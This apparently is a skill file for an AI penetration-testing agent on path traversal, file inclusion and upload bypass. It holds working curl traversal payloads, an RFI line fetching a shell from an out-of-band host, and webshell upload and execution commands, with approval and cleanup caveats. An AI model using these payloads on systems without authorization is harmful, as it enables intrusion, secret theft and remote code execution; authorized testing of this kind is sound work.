---
name: web-file-path
description: Use when a param names a file/path or an endpoint accepts uploads — path traversal, LFI/RFI, arbitrary read/write, and upload bypass. Classes traversal/upload.
---

# Path traversal, LFI/RFI & file upload

Two related sinks: params that resolve to a filesystem path (`traversal`, CWE-22) and endpoints that accept files (`upload`, CWE-434). Prove with a benign read (e.g. `/etc/passwd`, `web.config`) — do not overwrite or delete server files, and do not plant a live webshell on a production target without engagement approval.

Per candidate: `record kind=hypothesis ... class=traversal|upload outcome=testing`.

## Path traversal / LFI (class=traversal)
Sinks: `file=`, `path=`, `page=`, `template=`, `download=`, `include=`, `lang=`, `doc=`, image/attachment fetchers.
```bash
curl -s "https://TARGET/download?file=../../../../etc/passwd"           # linux
curl -s "https://TARGET/download?file=..%2f..%2f..%2fetc%2fpasswd"      # url-encoded
curl -s "https://TARGET/download?file=....//....//etc/passwd"           # nested (defeats naive strip)
curl -s "https://TARGET/page?file=..%252f..%252fetc%252fpasswd"         # double-encoded
# windows: ..\..\..\windows\win.ini   |   null-ish/truncation: file=../../etc/passwd%00.png (legacy)
```
- Confirm: the response **contains file content** (`root:x:0:0` for passwd), not just a 200.
- PHP wrappers for LFI→source disclosure / RCE: `php://filter/convert.base64-encode/resource=index.php`, `data://`, `expect://`, log poisoning, `/proc/self/environ`.
- **RFI** (CWE-98): `?page=http://OOB/shell.txt` — confirm with an OOB fetch (rare; needs `allow_url_include`).

## Arbitrary file read/write
- Read: any traversal that reaches app config/secrets (`.env`, `config.php`, cloud creds, `id_rsa`) → high/critical; record the secret as `loot`.
- Write: upload/move/rename that lets you place a file in a web-served or startup path → potential RCE.

## File upload bypass (class=upload)
Layered checks; bypass each layer:
1. **Extension:** `shell.php`, then `.phtml/.php5/.pht/.phar`, `.asp/.aspx/.jsp`, double `shell.php.jpg`, trailing dot/space `shell.php.`, case `shell.PHp`, null `shell.php%00.jpg`, `.htaccess`/`web.config` to reinterpret.
2. **Content-Type:** send `image/png` while body is PHP.
3. **Magic bytes:** prepend `GIF89a;` or valid PNG header, then payload — beats content sniffing.
```bash
curl -s -F 'file=@shell.php;type=image/png' https://TARGET/upload -b 'session=<auth>'
# then locate & fetch it:
curl -s "https://TARGET/uploads/shell.php?cmd=id"
```
4. **SVG/XML uploads** → stored XSS or XXE (SVG is XML — see web-xxe): `<svg><script>...</script></svg>` or an external-entity DOCTYPE.
5. **Path in filename:** `filename="../../avatar.php"` → traversal-on-write.
6. **Polyglots / image parsers:** ImageMagick/ffmpeg sinks (ImageTragick), zip-slip in archive extractors.

## Confirm vs false positive
- A generic 200/echoed filename is not proof. Require: leaked file *contents* (traversal), or the uploaded handler *executing* / being served with a dangerous content-type (upload). Fetch the file back and prove behavior.
- Prefer a harmless webshell that only runs `id`/`whoami`; remove any artifact you plant and note it. For an unapproved intrusive step, `record kind=blocker blockerType=approval`.

## Wire into the loop
```
record kind=hypothesis statement="file= param reads outside webroot" target=e4 class=traversal approach="../../etc/passwd, url-encoded" outcome=confirmed evidence=evidence/lfi-passwd.txt
record kind=finding title="Path traversal reads arbitrary files via /download?file" severity=high target=e4 class=traversal cwe=CWE-22 status=confirmed hypothesisId=y2 evidence=["evidence/lfi-passwd.txt"]
record kind=finding title="Unrestricted upload → RCE via .phtml webshell" severity=critical target=e_upload class=upload cwe=CWE-434 status=confirmed hypothesisId=y3
```
Severity: upload→RCE / arbitrary write = critical; arbitrary read of secrets = high; traversal of non-sensitive files = medium.
